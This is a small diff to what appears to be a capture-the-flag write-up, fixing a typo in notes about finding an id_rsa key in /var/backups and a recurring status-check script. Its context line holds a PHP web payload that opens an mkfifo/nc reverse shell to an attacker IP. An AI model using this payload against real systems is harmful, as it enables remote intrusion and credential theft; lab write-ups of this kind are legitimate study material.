@@ -49,7 +49,7 @@ paload : <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip
 
 ### First access
 ```
-hind in jack directory to see backups
+hint in jack directory to see backups
 in /var/backups found id_rsa
 
 found in /opt/statuscheck stript running between 2 minuts
